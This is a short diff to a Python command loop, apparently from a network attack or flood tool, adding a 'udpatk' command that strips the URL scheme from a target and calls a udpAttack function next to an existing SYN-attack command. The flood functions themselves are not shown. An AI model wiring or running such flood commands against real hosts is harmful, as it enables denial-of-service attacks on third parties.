@@ -45,6 +45,9 @@ def main():
             elif cmd[0] == "bsynatk":
 
                 synAttackBetter(cmd[1],cmd[2], int(cmd[3]))
+            elif cmd[0] == "udpatk":
+
+                udpAttack(cmd[1].lower().replace("http://",'').replace("https://",''), int(cmd[2]), int(cmd[3]))
             elif cmd[0] == "set":
                 if cmd[1] == "reset":
                     initConfig(CONFIG)
